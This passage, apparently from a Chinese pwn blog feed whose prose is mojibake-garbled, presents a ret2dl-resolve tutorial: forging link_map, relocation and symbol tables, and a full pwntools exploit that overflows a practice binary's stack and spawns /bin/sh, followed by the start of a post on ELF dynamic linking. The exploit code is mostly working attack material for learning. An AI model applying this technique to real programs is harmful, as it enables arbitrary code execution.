class="comment">/* Various flag words.  */</span></span><br><span class="line">    ElfW(Word) l_feature_1;</span><br><span class="line">    ElfW(Word) l_flags_1;</span><br><span class="line">    ElfW(Word) l_flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Temporarily used in `dl_close&#x27;.  */</span></span><br><span class="line">    <span class="keyword">int</span> l_idx;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_machine</span> <span class="title">l_mach</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym</span>;</span><br><span class="line">      <span class="keyword">int</span> type_class;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">value</span>;</span></span><br><span class="line">      <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *ret</span>;</span><br><span class="line">    &#125; l_lookup_cache;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Thread-local storage related info.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Start of the initialization image.  */</span></span><br><span class="line">    <span class="keyword">void</span> *l_tls_initimage;</span><br><span class="line">    <span class="comment">/* Size of the initialization image.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_initimage_size;</span><br><span class="line">    <span class="comment">/* Size of the TLS block.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_blocksize;</span><br><span class="line">    <span class="comment">/* Alignment requirement of the TLS block.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_align;</span><br><span class="line">    <span class="comment">/* Offset of first byte module alignment.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_firstbyte_offset;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> NO_TLS_OFFSET</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> NO_TLS_OFFSET0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FORCED_DYNAMIC_TLS_OFFSET</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> NO_TLS_OFFSET == 0</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -1</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">elif</span> NO_TLS_OFFSET == -1</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -2</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">error</span> <span class="meta-string">&quot;FORCED_DYNAMIC_TLS_OFFSET is not defined&quot;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* For objects present at startup time: offset in the static TLS block.  */</span></span><br><span class="line">    <span class="keyword">ptrdiff_t</span> l_tls_offset;</span><br><span class="line">    <span class="comment">/* Index of the module in the dtv array.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_modid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of thread_local objects constructed by this DSO.  This is</span></span><br><span class="line"><span class="comment">       atomically accessed and modified and is not always protected by the load</span></span><br><span class="line"><span class="comment">       lock.  See also: CONCURRENCY NOTES in cxa_thread_atexit_impl.c.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_dtor_count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Information used to change permission after the relocations are</span></span><br><span class="line"><span class="comment">       done.  */</span></span><br><span class="line">    ElfW(Addr) l_relro_addr;</span><br><span class="line">    <span class="keyword">size_t</span> l_relro_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> l_serial;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Audit information.  This array apparent must be the last in the</span></span><br><span class="line"><span class="comment">       structure.  Never add something after it.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">auditstate</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="keyword">uintptr_t</span> cookie;</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> bindflags;</span><br><span class="line">    &#125; l_audit[<span class="number">0</span>];</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¼šå‘ç°ä¸Šé¢çš„ç»“æ„ä½“éå¸¸çš„å¤æ‚ï¼Œå¾ˆéš¾æ‰¾åˆ°æˆ‘ä»¬<strong>STRTAB/SYMTAB/JMPREL</strong>è¿™3ä¸ªè¡¨å­˜æ”¾çš„ä½ç½®ï¼Œä½†æ˜¯é€šè¿‡åŠ¨æ€è°ƒè¯•æˆ‘ä»¬å¯ä»¥å¾—çŸ¥è¿™ä¸‰ä¸ªåœ°å€å­˜æ”¾åˆ†åˆ«ä½äº<strong>link_map+0x68/0x70/0xf8</strong>å¤„ï¼Œå¦‚æ­¤ä¸€æ¥æˆ‘ä»¬åªéœ€è¦å°†è¿™ä¸‰ä¸ªè¡¨ä¼ªé€ å‡ºæ¥ï¼Œç„¶ååœ¨ç›¸åº”ä½ç½®å­˜æ”¾å®ƒä»¬çš„åœ°å€å³å¯ã€‚</p><p>æˆ‘ä»¬å…ˆç¡®å®šä¸€ä¸‹sym-&gt;st_valueåº”è¯¥è½åœ¨å“ªä¸ªå‡½æ•°ä¸Šï¼Œæˆ‘ä»¬å…ˆæŸ¥çœ‹writeå‡½æ•°gotè¡¨é¡¹å‰ä¸€ä¸ªè¡¨é¡¹çš„å€¼</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210826203620182.png" alt="æŸ¥çœ‹gotè¡¨é¡¹"></p><p>å¯ä»¥ç¡®å®šæ˜¯å¯ä»¥ä½¿ç”¨writeä½œä¸ºsym-&gt;st_valueã€‚</p><p>ç¡®è®¤æˆ‘ä»¬éœ€è¦ç”¨åˆ°çš„ä¸€äº›ä½ç½®</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset=<span class="number">120</span></span><br><span class="line"></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">jmp_dl_fixup=<span class="number">0x401026</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x800</span></span><br><span class="line">fake_link_map_addr=fake_stack+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">gadget1=<span class="number">0x40121A</span>    <span class="comment">#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn</span></span><br><span class="line">gadget2=<span class="number">0x401200</span>    <span class="comment">#mov rdx, r14; mov rsi, r13; mov edi, r12d; call qword ptr [r15+rbx*8]</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401223</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401221</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x40113d</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">leave_ret=<span class="number">0x40118f</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆå°†æ ˆè¿ç§»åˆ°.bssæ®µå‡†å¤‡å¹¶åœ¨æ ˆé‡Œè¯»å…¥æˆ‘ä»¬çš„payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx ä¸ºäº†åé¢è·³è½¬åšåç§»</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp,ä¸å¯ä¸º0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(fake_stack)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">0x500</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span><span class="comment">#è¿”å›åå¯¹æ ˆä¼šè¿›è¡Œpop</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rbp_ret)<span class="comment">#è¿”å›åˆ°pop rbp; retnï¼ŒåŠ«æŒæ ˆã€‚</span></span><br><span class="line">payload += p64(fake_stack)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯é‡å¤´æˆä¼ªé€ æˆ‘ä»¬çš„link_mapï¼Œåœ¨ä¼ªé€ link_mapä¹‹å‰æˆ‘ä»¬å…ˆæŠŠéœ€è¦ç”¨åˆ°çš„ä¸‰ä¸ªè¡¨å…ˆä¼ªé€ å¥½</p><p>ä¼ªé€ .dynamicé‡Œçš„é‡å®šä½è¡¨é¡¹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_relplt_Elf64_Dyn =p64(<span class="number">0</span>)                                   <span class="comment">#d_tag  æ ‡ç­¾ï¼Œç”¨ä¸åˆ°å¯ä»¥éšæ„è®¾ç½®</span></span><br><span class="line">fake_relplt_Elf64_Dyn+=p64(fake_Elf64_Rela_addr)                <span class="comment">#d_ptr  æŒ‡å‘è™šå‡çš„Elf64_Relaç»“æ„ä½“çš„æŒ‡é’ˆã€‚å› ä¸ºreloc_offsetè¢«ç®€åŒ–ä¸º0ï¼Œæ‰€ä»¥è¯¥åœ°å€å°±æ˜¯æˆ‘ä»¬ä¼ªé€ çš„åœ°å€</span></span><br></pre></td></tr></table></figure><p>ä¼ªé€ é‡å®šä½è¡¨</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_Elf64_Rela =flat(fake_link_map_addr-system_write_offset)   <span class="comment">#r_offset   rel_addr = l-&gt;addr+r_offset,è¿™é‡Œè®©å…¶å†™å…¥ä¸€ä¸ªå¯å†™åœ°å€å³å¯ï¼Œè¿™é‡Œé€‰æ‹©fake_link_mapï¼Œå› ä¸ºæˆ‘ä»¬çš„l-&gt;addrä¸ºsystem_write_offseté‚£ä¹ˆr_offset=fake_link_map_addr-system_write_offset</span></span><br><span class="line">fake_Elf64_Rela+=p64(<span class="number">7</span>)                                         <span class="comment">#r_info     indexè®¾ç½®ä¸º0ï¼Œæœ€åä¸€å­—èŠ‚å¿…é¡»ä¸º7</span></span><br><span class="line">fake_Elf64_Rela+=p64(<span class="number">0</span>)                                         <span class="comment">#r_addend   ä»»æ„è®¾ç½®å³å¯</span></span><br></pre></td></tr></table></figure><p>ä¼ªé€ ç¬¦å·è¡¨</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_Elf64_Sym =p32(<span class="number">0</span>)                                          <span class="comment">#st_nameä»»æ„è®¾ç½®</span></span><br><span class="line">fake_Elf64_Sym+=p32(<span class="number">0xffffffff</span>)                                 <span class="comment">#ä¿è¯st_info, st_other, st_shndx st_otheréé›¶r</span></span><br><span class="line">fake_Elf64_Sym+=p64(write_got-<span class="number">8</span>)                                <span class="comment">#st_value   å·²ç»è§£æçš„å‡½æ•°gotåœ°å€å‡å»8</span></span><br><span class="line">fake_Elf64_Sym+=p64(<span class="number">0</span>)            <span class="comment">#st_sizeéšæ„è®¾ç½®</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±è¯¥ä¼ªé€ link_mapæœ¬èº«äº†ï¼Œæˆ‘ä»¬ä¼šå‘ç°ä¼ªé€ link_mapä¸­æœ‰å¥½å¤šåœ°æ–¹æ˜¯ç©ºçš„ï¼Œæˆ‘ä»¬ä¸å¦¨åˆ©ç”¨èµ·æ¥ï¼Œå°†ä»€ä¹ˆä¸‰ä¸ªè¡¨é¡¹ä¹Ÿæ”¾å…¥link_mapç»“æ„ä¸­,é¡ºä¾¿æŠŠåé¢è¦ç”¨åˆ°çš„â€™/bin/sh\x00â€™ä¹Ÿå†™å…¥ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_link_map =flat(system_write_offset)                        <span class="comment">#l_addr</span></span><br><span class="line">fake_link_map+=fake_relplt_Elf64_Dyn</span><br><span class="line">fake_link_map+=fake_Elf64_Rela</span><br><span class="line">fake_link_map+=fake_Elf64_Sym</span><br><span class="line">fake_link_map+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">fake_link_map+=p64(fake_link_map_addr)                          <span class="comment">#DT_STRTAB  ä»»æ„å¯è¯»ä½ç½®å³å¯</span></span><br><span class="line">fake_link_map+=p64(fake_Elf64_Sym_addr)                         <span class="comment">#DT_SYMTAB  æŒ‡å‘fake_Elf64_Sym</span></span><br><span class="line">fake_link_map+=<span class="string">&#x27;/bin/sh\x00&#x27;</span>                                    <span class="comment">#binsh</span></span><br><span class="line">fake_link_map+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x78</span></span><br><span class="line">fake_link_map+=p64(fake_relplt_Elf64_Dyn_addr)                  <span class="comment">#DT_JMPREL  æŒ‡å‘fake_relplt_Elf64_Dyn</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åªéœ€å°†binshçš„åœ°å€æ”¾å…¥å¯„å­˜å™¨ä¸­å†è°ƒç”¨jmp_dl_fixupåˆ°æˆ‘ä»¬æ„é€ å¥½çš„link_mapå³å¯</p><p>å®Œæ•´exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_partialrelro_64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_partialrelro_64&#x27;</span>)</span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">120</span></span><br><span class="line"></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">jmp_dl_fixup=<span class="number">0x401026</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x800</span></span><br><span class="line">fake_link_map_addr=fake_stack+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">gadget1=<span class="number">0x40121A</span>    <span class="comment">#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn</span></span><br><span class="line">gadget2=<span class="number">0x401200</span>    <span class="comment">#mov rdx, r14; mov rsi, r13; mov edi, r12d; call qword ptr [r15+rbx*8]</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401223</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401221</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x40113d</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">leave_ret=<span class="number">0x40118f</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#å…ˆè°ƒç”¨readå°†æ•°æ®å†™å…¥.bssæ®µ</span></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx ä¸ºäº†åé¢è·³è½¬åšåç§»</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp,ä¸å¯ä¸º0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(fake_stack)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">0x500</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span><span class="comment">#è¿”å›åå¯¹æ ˆä¼šè¿›è¡Œpop</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rbp_ret)<span class="comment">#è¿”å›åˆ°pop rbp; retnï¼ŒåŠ«æŒæ ˆã€‚</span></span><br><span class="line">payload += p64(fake_stack)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">system_write_offset=libc.sym[<span class="string">&#x27;system&#x27;</span>]-libc.sym[<span class="string">&#x27;write&#x27;</span>]    <span class="comment">#åé¢ä¼ªé€ link_mapæ—¶l_addrçš„å€¼</span></span><br><span class="line">success(<span class="string">&#x27;system_write_offset :&#x27;</span>+<span class="built_in">hex</span>(system_write_offset))</span><br><span class="line">fake_relplt_Elf64_Dyn_addr=fake_link_map_addr+<span class="number">0x8</span></span><br><span class="line">fake_Elf64_Sym_addr=fake_link_map_addr+<span class="number">0x30</span></span><br><span class="line">fake_Elf64_Rela_addr=fake_link_map_addr+<span class="number">0x18</span></span><br><span class="line">binsh_addr=fake_link_map_addr+<span class="number">0x78</span></span><br><span class="line"></span><br><span class="line">fake_relplt_Elf64_Dyn =p64(<span class="number">0</span>)                                   <span class="comment">#d_tag  æ ‡ç­¾ï¼Œç”¨ä¸åˆ°å¯ä»¥éšæ„è®¾ç½®</span></span><br><span class="line">fake_relplt_Elf64_Dyn+=p64(fake_Elf64_Rela_addr)                <span class="comment">#d_ptr  æŒ‡å‘è™šå‡çš„Elf64_Relaç»“æ„ä½“çš„æŒ‡é’ˆã€‚å› ä¸ºreloc_offsetè¢«ç®€åŒ–ä¸º0ï¼Œæ‰€ä»¥è¯¥åœ°å€å°±æ˜¯æˆ‘ä»¬ä¼ªé€ çš„åœ°å€</span></span><br><span class="line"></span><br><span class="line">fake_Elf64_Rela =flat(fake_link_map_addr-system_write_offset)   <span class="comment">#r_offset   rel_addr = l-&gt;addr+r_offset,è¿™é‡Œè®©å…¶å†™å…¥ä¸€ä¸ªå¯å†™åœ°å€å³å¯ï¼Œè¿™é‡Œé€‰æ‹©fake_link_mapï¼Œå› ä¸ºæˆ‘ä»¬çš„l-&gt;addrä¸ºsystem_write_offseté‚£ä¹ˆr_offset=fake_link_map_addr-system_write_offset</span></span><br><span class="line">fake_Elf64_Rela+=p64(<span class="number">7</span>)                                         <span class="comment">#r_info     indexè®¾ç½®ä¸º0ï¼Œæœ€åä¸€å­—èŠ‚å¿…é¡»ä¸º7</span></span><br><span class="line">fake_Elf64_Rela+=p64(<span class="number">0</span>)                                         <span class="comment">#r_addend   ä»»æ„è®¾ç½®å³å¯</span></span><br><span class="line"></span><br><span class="line">fake_Elf64_Sym =p32(<span class="number">0</span>)                                          <span class="comment">#st_nameä»»æ„è®¾ç½®</span></span><br><span class="line">fake_Elf64_Sym+=p32(<span class="number">0xffffffff</span>)                                 <span class="comment">#ä¿è¯st_info, st_other, st_shndx st_otheréé›¶r</span></span><br><span class="line">fake_Elf64_Sym+=p64(write_got-<span class="number">8</span>)                                <span class="comment">#st_value   å·²ç»è§£æçš„å‡½æ•°gotåœ°å€å‡å»8</span></span><br><span class="line">fake_Elf64_Sym+=p64(<span class="number">0</span>)            <span class="comment">#st_sizeéšæ„è®¾ç½®</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_link_map =flat(system_write_offset)                        <span class="comment">#l_addr</span></span><br><span class="line">fake_link_map+=fake_relplt_Elf64_Dyn</span><br><span class="line">fake_link_map+=fake_Elf64_Rela</span><br><span class="line">fake_link_map+=fake_Elf64_Sym</span><br><span class="line">fake_link_map+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">fake_link_map+=p64(fake_link_map_addr)                          <span class="comment">#DT_STRTAB  ä»»æ„å¯è¯»ä½ç½®å³å¯</span></span><br><span class="line">fake_link_map+=p64(fake_Elf64_Sym_addr)                         <span class="comment">#DT_SYMTAB  æŒ‡å‘fake_Elf64_Sym</span></span><br><span class="line">fake_link_map+=<span class="string">&#x27;/bin/sh\x00&#x27;</span>                                    <span class="comment">#binsh</span></span><br><span class="line">fake_link_map+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x78</span></span><br><span class="line">fake_link_map+=p64(fake_relplt_Elf64_Dyn_addr)                  <span class="comment">#DT_JMPREL  æŒ‡å‘fake_relplt_Elf64_Dyn</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(binsh_addr)</span><br><span class="line">payload+=p64(jmp_dl_fixup)</span><br><span class="line">payload+=p64(fake_link_map_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload =payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">payload+=fake_link_map</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sn(io,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="ç»“å°¾"><a href="#ç»“å°¾" class="headerlink" title="ç»“å°¾"></a>ç»“å°¾</h1><p>é™¤å»æ¯”èµ›èŠ±äº†ä¸¤å‘¨æ—¶é—´ç»ˆäºæŠŠret2dlæ€»ç»“å®Œäº†ï¼Œå‚è€ƒäº†ç½‘ç»œä¸Šå¥½å¤šå¸ˆå‚…çš„åšå®¢å’Œèµ„æ–™ï¼Œå­¦åˆ°äº†å¥½å¤šï¼ŒçœŸå¿ƒå¸Œæœ›è¿™ç¯‡åšå®¢ä¹Ÿèƒ½å¸®åŠ©çœ‹è§å®ƒçš„ä½ ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸ret2dlæœ‰å…³çš„å‰ç½®çŸ¥è¯†-åŠ¨æ€é“¾æ¥</title>
      <link href="/2021/08/11/%E4%B8%8Eret2dl%E6%9C%89%E5%85%B3%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"/>
      <url>/2021/08/11/%E4%B8%8Eret2dl%E6%9C%89%E5%85%B3%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¹‹å‰å†™è¿™ç¯‡åšå®¢çš„æ—¶å€™æ²¡æœ‰å­¦ä¹ é™æ€é“¾æ¥å°±å»è¡¥äº†è¡¥çŸ¥è¯†ï¼Œç´¢æ€§æŠŠè¿™ç¯‡åšå®¢ä¹Ÿæ”¹ä¸ºåŸºç¡€çŸ¥è¯†ï¼Œåé¢å†å†™å…·ä½“çš„æ”»å‡»æ–¹æ³•ã€‚çœ‹è¿™ç¯‡å‰å¯ä»¥å…ˆäº†è§£ä¸€ä¸‹é™æ€é“¾æ¥ã€‚</p><h1 id="ä¸€äº›é‡è¦çš„section"><a href="#ä¸€äº›é‡è¦çš„section" class="headerlink" title="ä¸€äº›é‡è¦çš„section"></a>ä¸€äº›é‡è¦çš„section</h1><h2 id="â€œ-interpâ€"><a href="#â€œ-interpâ€" class="headerlink" title="â€œ.interpâ€"></a>â€œ.interpâ€</h2><p>å½“æˆ‘ä»¬çš„ç³»ç»Ÿå°†å¯æ‰§è¡Œæ–‡ä»¶è£…è½½ä¹‹åï¼Œå…¶ä¸­å¥½å¤šåœ°å€è¿˜å¤„äºæ— æ•ˆçŠ¶æ€ï¼Œæ­¤æ—¶éœ€è¦<strong>åŠ¨æ€é“¾æ¥å™¨</strong>é€šè¿‡æ˜ å°„çš„æ–¹æ³•åŠ è½½åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­ã€‚æ“ä½œç³»ç»ŸåŠ è½½å®ŒåŠ¨æ€é“¾æ¥å™¨åï¼Œå°†æ§åˆ¶æƒäº¤ç»™åŠ¨æ€é“¾æ¥å™¨çš„å…¥å£åœ°å€ã€‚åŠ¨æ€é“¾æ¥å™¨è·å–æ§åˆ¶å™¨ï¼Œæ‰§è¡Œè‡ªèº«åˆå§‹åŒ–å·¥ä½œï¼Œç„¶åæ ¹æ®ç¯å¢ƒå‚æ•°å¯¹å¯æ‰§è¡Œæ–‡ä»¶è¿›è¡ŒåŠ¨æ€é“¾æ¥å·¥ä½œã€‚å½“åŠ¨æ€é“¾æ¥å·¥ä½œå®Œæˆåå°†æ§åˆ¶æƒäº¤ç”±å¯æ‰§è¡Œæ–‡ä»¶å…¥å£ï¼Œç¨‹åºå¼€å§‹æ­£å¼æ‰§è¡Œã€‚</p><p>è€ŒåŠ¨æ€é“¾æ¥å™¨çš„ä½ç½®ç”±è°æ¥å†³å®šé‚£ï¼Ÿå®é™…ä¸Šæ˜¯ç”±ELFæ–‡ä»¶è‡ªå·±å†³å®šçš„ï¼Œè€Œå†³å®šè¿™ä¸€åˆ‡çš„sectionå«åš<em><strong>.interp</strong></em>ã€‚</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210726111522241.png" alt="â€™.interpâ€˜"></p><p>ä¸Šå›¾å°±æ˜¯æŸä¸ªæ–‡ä»¶çš„â€™.interpâ€™æ®µï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹åŠ¨æ€é“¾æ¥å™¨éƒ½ä½äº/libé‡Œï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ç”¨patchelfæ›´æ”¹è¿‡äº†ï¼Œä¹Ÿè¯´æ˜è¿™é‡Œæ˜¯å¯ä»¥æ›´æ”¹çš„ï¼Œç”±ELFæ–‡ä»¶è‡ªå·±å†³å®šçš„ã€‚</p><p>è¿™ä¸ªæ®µçš„å†…å®¹å¾ˆç®€å•ï¼Œé‡Œé¢å°±ä¿å­˜äº†ä¸Šé¢è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œè€Œè¿™ä¸ªå­—ç¬¦ä¸²å°±æ˜¯åŠ¨æ€é“¾æ¥å™¨çš„è·¯å¾„ã€‚</p><h2 id="â€œ-dynamicâ€"><a href="#â€œ-dynamicâ€" class="headerlink" title="â€œ.dynamicâ€"></a>â€œ.dynamicâ€</h2><p>åŠ¨æ€é“¾æ¥æœ€ä¸ºé‡è¦çš„ç»“æ„å°±æ˜¯<em><strong>.dynamic</strong></em>ï¼Œè¿™ä¸ªæ®µä¿å­˜äº†åŠ¨æ€é“¾æ¥åº“éœ€è¦çš„æœ€åŸºæœ¬çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ä¾èµ–äºå“ªäº›å…±äº«å¯¹è±¡ã€åŠ¨æ€è¿æ¥ç¬¦å·è¡¨çš„ä½ç½®ã€åŠ¨æ€é“¾æ¥é‡å®šä½è¡¨ä½ç½®ã€å…±äº«å¯¹è±¡åˆå§‹åŒ–ä»£ç çš„åœ°å€ç­‰ã€‚ä¹¦ä¸Šå†™è¿™ä¸ªsectionæœ‰ç‚¹ç±»ä¼¼äºELFçš„æ–‡ä»¶å¤´ï¼Œç¡®å®ï¼Œå…¶å½¢å¼æ›´åƒæ˜¯ELF 